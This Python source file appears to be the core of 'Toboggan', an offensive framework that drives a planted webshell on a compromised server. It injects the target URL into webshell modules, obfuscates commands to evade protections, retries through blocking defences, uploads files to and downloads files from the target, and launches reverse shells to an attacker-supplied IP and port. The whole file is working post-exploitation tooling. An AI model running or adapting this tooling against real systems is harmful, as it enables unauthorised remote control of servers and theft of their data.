# Built-in imports
import base64
import gzip
import importlib.util
import random
import time
import types
from pathlib import Path
from typing import TYPE_CHECKING
from urllib.parse import parse_qs, urlparse
import socket

# Third party library imports
import httpx

# Type checking
if TYPE_CHECKING:
    from toboggan.src import operating_systems

CURRENT_PATH = Path(__file__).resolve().parent

BUILT_IN_MODULES_DIR = CURRENT_PATH.parent / "modules"
DEFAULT_MODULE = BUILT_IN_MODULES_DIR / "webshell.py"


class Module:
    def __init__(
        self,
        module_path: str = None,
        url: str = None,
        password_param: str = None,
        password_content: str = None,
        burp_proxy: bool = False,
    ) -> None:
        """
        Initializes the Module class.

        Args:
            module_path (str, optional): Path to the Python module that is to be executed.
                                        Defaults to 'webshell' if not specified.
            url (str, optional): URL to use if a built-in module is specified.
            password_param (str, optional): Name of the password parameter key, e.g., "pass".
                                        If not provided but password_content is given, a default key "ps" will be used.
            password_content (str, optional): Value of the password to be set for the module.
                                            Will be used if a placeholder is present in the module code.

        Raises:
            FileNotFoundError: If the specified module file does not exist.
            TypeError: If the specified file is not a Python module (does not have .py extension).
            ValueError: If a built-in module is specified without an accompanying URL.
        """
        if module_path is None:
            module_path = "webshell"

        # Store the module code for reference
        self.__module_code = ""

        # Try to get the path of the built-in module
        built_in_module_path = BUILT_IN_MODULES_DIR / (module_path + ".py")
        if built_in_module_path.exists():
            self.__module_name = module_path
            print(f"[Toboggan] Using builtin method {self.__module_name}.")

            module_code = built_in_module_path.read_text(encoding="utf-8")

            if module_path == "webshell":
                if url is None:
                    raise ValueError(
                        f"[Toboggan] No url provided. Cannot handle the webshell."
                    )

                # Extract the parameter key from the provided URL
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                # Get the last parameter key from the URL query. Default to 'cmd' if no parameters present.
                param_key = list(query_params.keys())[-1] if query_params else "cmd"

                module_code = module_code.replace("||URL||", url).replace(
                    "||PARAM_CMD||", param_key
                )

                if password_content is not None:
                    if password_param is not None:
                        password = f'"{password_param}": "{password_content}",'
                    else:
                        password = f'"ps": "{password_content}",'

                    module_code = module_code.replace("# ||PARAM_PASSWORD||", password)

            if "||BURP||" in module_code and burp_proxy:
                print("[Toboggan] All requests will be transmitted through Burp proxy.")
                module_code = module_code.replace(
                    "# ||BURP||",
                    'proxies={"http://": "http://127.0.0.1:8080", "https://": "https://127.0.0.1:8080"},',
                )

            self.__module_code = module_code
            self.__module = types.ModuleType(name=self.__module_name)
            exec(module_code, self.__module.__dict__)
        else:
            print(f"[Toboggan] Searching for provided module path: '{module_path}'.")
            module_path = Path(module_path)
            self.__module_name = module_path.name
            if not module_path.exists():
                raise FileNotFoundError(
                    f"The specified file {self.__module_name} does not exist."
                )

            if module_path.suffix != ".py":
                raise TypeError("The specified file is not a Python module 🐍.")

            spec = importlib.util.spec_from_file_location(module_path.stem, module_path)
            self.__module = importlib.util.module_from_spec(spec)
            self.__module_code = Path(module_path).read_text(encoding="utf-8")
            spec.loader.exec_module(self.__module)

        if not hasattr(self.__module, "execute") or not callable(
            getattr(self.__module, "execute")
        ):
            print(
                f"The module {self.__module_name} does not contain a callable 'execute' method."
            )
            return
        print(f"[Toboggan] Module {self.__module_name} loaded 💾.")

    # Public methods

    # Properties
    @property
    def module(self):
        return self.__module

    @property
    def module_name(self) -> str:
        return self.__module_name

    @property
    def module_code(self) -> str:
        return self.__module_code


class Executor:
    """Executor class for handling module execution."""

    # Since files are generally read byte-by-byte, chunk_size is in bytes.
    CHUNK_SIZE = 2 << 10

    def __init__(self, module: "Module") -> None:
        """
        Initializes the Executor class with a specified module.

        Args:
            module (Module): An instance of the Module class to be executed.

        Note:
            The executor uses a default chunk size for file actions.
        """

        self.__obfuscation = True

        self.__module = module.module

        self.__os_handler = None

        self.__chunk_size = Executor.CHUNK_SIZE
        print(
            f"[Toboggan] Default chunk size for file action is {self.__chunk_size} bytes."
        )

    # Public methods
    def execute(self, command: str, timeout: float = None, retry: bool = True) -> str:
        """Executes the specified command within the module.

        Args:
            command (str): Command to be executed within the module.

        Returns:
            str: Result of the executed command within the module, if successful.
        """

        result = ""

        if self.__os_handler is not None and self.__obfuscation:
            command = self.__os_handler.prepare_command(command=command)

        for attempt in range(5):
            try:
                result = self.__module.execute(command=command, timeout=timeout)
            except Exception as error:
                print(f"[Toboggan] Exception occured: {error}")
                if "414 Request-URI" in str(error):
                    break

                if not retry:
                    return

                # Sometimes, load balancers and protections can make requests
                # succeed every other time.
                # Let's implement an exponential backoff with jitter
                sleep_time = (2**attempt) + (random.randint(0, 1000) / 1000)

                print(f"[Toboggan] Sleeping for {sleep_time} seconds.")
                time.sleep(sleep_time)
                continue
            else:
                break

        if "403 Forbidden" in result:
            raise ConnectionError("403 Forbidden")

        if self.__obfuscation and self.__os_handler and result:
            try:
                result = self.__os_handler.unobfuscate_result(result)
            except ValueError as error:
                raise ValueError(
                    f"Unobfuscation of the received output failed.\n\t-Command: {command!r}\n\t-Result: {result!r}"
                ) from error

        return result

    def one_shot_execute(self, command: str) -> str:
        """Execute a command without returning nothing and with a fast timeout.

        Args:
            command (str): Command to be executed.
        """
        try:
            if self.__os_handler is not None and self.__obfuscation:
                command = self.__os_handler.prepare_command(command=command)
            return self.__module.execute(command=command, timeout=1.5)
        except:
            pass

    def is_alive(self) -> bool:
        """
        Check if the target module is reachable and operational by executing a command.

        This method attempts to run an empty command on the target module with a specified timeout.
        If the module responds within the timeout, it is considered 'alive', and the response time is printed.
        If an error occurs during the execution or the module doesn't respond, it is considered 'not alive'.

        Returns:
            bool: True if the target module is reachable and operational, False otherwise.
        """
        start_time = time.time()

        try:
            self.execute(command="whoami", timeout=5)
        except Exception as error:
            print(f"[Toboggan] Impossible to reach the target 🎯.")
            print(f"[Toboggan] Root cause: {error}")
            return False
        else:
            end_time = time.time()
            response_time = (end_time - start_time) * 1000  # Convert to milliseconds
            print(f"[Toboggan] Target is reachable in {response_time:.2f} ms 🎯.")
            return True

    def os_guessing(self) -> str:
        """
        Guess the operating system based on the command's directory output.

        This method attempts to identify the operating system by executing directory-related commands
        and checking their outputs. It uses the presence of backslashes or forward slashes in the path
        as a heuristic to guess the OS type.

        Returns:
            str: 'windows' if a Windows OS is detected, 'unix' if a Unix-like OS is detected,
                and None if the OS cannot be determined.
        """
        result = self.__module.execute(command="PATH")

        if not result:
            print(f"[Tooboggan] OS not detected.")
            return None

        if "not recognized as the name of a cmdlet" in result:
            print("[Toboggan] Detected PowerShell behavior; assuming Windows OS 🖥️.")
            return "windows"

        if "PATH=C:\Windows\system32;" in result:
            print("[Toboggan] Detected DOS behavior; assuming Windows OS 🖥️.")
            return "windows"

        print("[Toboggan] Assuming Unix-like OS 🖥️.")
        return "unix"

    def set_os(self, os_handler: "operating_systems.OSHandler") -> None:
        self.__os_handler = os_handler
        self.__os_handler.fetch_initial_details()

    def reverse_shell(
        self, ip_addr: str = None, port: int = None, shell: str = None
    ) -> None:
        if ip_addr is None:
            print(
                "[Toboggan] An IP address is required to launch a revshell. Here are yours:"
            )
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as chaussette:
                chaussette.connect(("92.93.94.95", 1))
                local_ip = chaussette.getsockname()[0]

            print(f"\t> Local IP: {local_ip}")
            print(f"\t> Public IP: {httpx.get('https://ident.me').text}")
            return

        print(f"[Toboggan] Launching a reverse shell ({shell}) to {ip_addr}:{port} 🕊️.")
        self.__os_handler.reverse_shell(ip_addr, port, shell)

    def determine_best_chunk_size(self) -> None:
        """
        Determine the optimal chunk size for sending data to the target using a dichotomic search.

        This method seeks to identify the largest possible chunk size (between 1 KiB and 1 MiB)
        that can be sent to the target without causing an error or receiving no response. The
        search utilizes a dichotomic or binary search approach to efficiently find the best chunk size.

        The process involves sending an increasing size of 'junk data' combined with a real command ('hostname')
        to the target and observing the response. If a response is received, it implies the chunk size is acceptable,
        and the search space is adjusted accordingly. If an error occurs or no response is received, the chunk size
        is reduced.

        Warning:
            This method can be noisy, potentially causing multiple error messages or disruptions on the target system.
            Use with caution.

        Attributes modified:
            self.__chunk_size: This will be set to the determined optimal chunk size at the end of the function.
        """
        min_chunk_size = 1024  # 1 KiB
        max_chunk_size = 2 << 19  # 1 MiB
        last_successful_chunk_size = min_chunk_size

        print(
            f"[Toboggan] Searching for best chunk size using dichotomy between 1 KiB to 1 MiB ... 🧮"
        )

        while min_chunk_size <= max_chunk_size and (
            max_chunk_size - min_chunk_size > 1024
        ):
            test_chunk_size = (min_chunk_size + max_chunk_size) // 2
            junk_data = "hostname;" + "j" * test_chunk_size

            try:
                result = self.__module.execute(
                    command=junk_data, timeout=5, retry=False
                ).strip()

                if result:
                    last_successful_chunk_size = test_chunk_size
                    min_chunk_size = test_chunk_size + 1
                else:
                    max_chunk_size = test_chunk_size - 1
            except Exception:
                max_chunk_size = test_chunk_size - 1

        # Once loop finishes, set the optimal chunk size to the last successful one
        self.__chunk_size = last_successful_chunk_size

        print(f"[Toboggan] Determined chunk size: {self.__chunk_size} bytes.")

    def upload_file(
        self, file_content: bytes, remote_path: str, chunk_size: int = None
    ) -> None:
        print(f"[Toboggan] Uploading to remote path {remote_path!r} 📤.")
        self.__os_handler.upload_file(
            file_content, remote_path, chunk_size or self.__chunk_size
        )

    def download_file(
        self, remote_path: str, local_path: str, chunk_size: int = None
    ) -> None:
        """
        Downloads a file from the remote shell.

        Args:
            remote_path (str): The remote path to the file.
            local_path (str): The local path to the file.

        Returns:
            None
        """
        encoded_file = self.__os_handler.get_encoded_file(
            remote_path=remote_path, chunk_size=chunk_size or self.__chunk_size
        )
        if encoded_file is None:
            print(f"[Toboggan] Remote file '{remote_path}' does not exist.")
            return

        # Write the decompressed content to the local file
        Path(local_path).write_bytes(
            data=gzip.decompress(base64.b64decode(encoded_file))
        )

        print(
            f"[Toboggan] Downloaded file from remote {remote_path!r} to local {local_path!r} 📥."
        )

    # Private methods
    # Properties
    @property
    def obfuscation(self) -> bool:
        return self.__obfuscation

    @obfuscation.setter
    def obfuscation(self, needed: bool) -> None:
        self.__obfuscation = needed

    @property
    def user(self) -> str:
        return self.__os_handler.user

    @property
    def hostname(self) -> str:
        return self.__os_handler.hostname

    @property
    def pwd(self) -> str:
        return self.__os_handler.pwd

    @property
    def system_info(self) -> str:
        return self.__os_handler.system_info
